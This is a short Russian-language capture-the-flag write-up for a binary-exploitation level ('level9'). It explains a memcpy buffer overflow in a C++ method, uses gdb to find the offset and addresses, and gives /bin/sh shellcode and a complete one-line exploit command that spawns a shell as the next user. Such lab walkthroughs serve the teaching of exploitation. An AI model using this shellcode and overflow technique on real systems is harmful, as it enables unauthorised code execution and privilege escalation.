программа написана на cpp и запускает в методе класса функцию memcpy копируя 
поданный в программу агрумент, что может привести к переполнению
после выполнения метода регистр eax дважды разыменовывается и запускается как функция
мы можем переполнением положить в этот регистр ссылку на ссылку на шелкод,
сначала посчитаем отступ, но не от адреса в ошибке а от значения в eax:
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
info registers
затем узнаем адрес, куда кладет интересующую нас строку метод класса,
disas 0x0804870e
b *0x08048733
r with_text
i r
>edx            0x804a00c
так как далее последует еще одно разыменование, мы не можем сразу указывать на наш шел код
требуется сделать еще одну ссылку на следующий участо шелкода : 0x804a00c + 4 = 0x804a010
воспользуемся шелкодом из упражнения lvl2:
шелкод ниже является аналогом данной этой функции и может быть получен через disas /r
 #include <stdio.h>
       main() {
       char *name[2];
       name[0] = "sh";
       name[1] = NULL;
       execve("/bin/sh",name,NULL);
          }
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
его длина 45 символов, итого 45+4+х=108, отступ 59, итак:
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "U" * 59 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
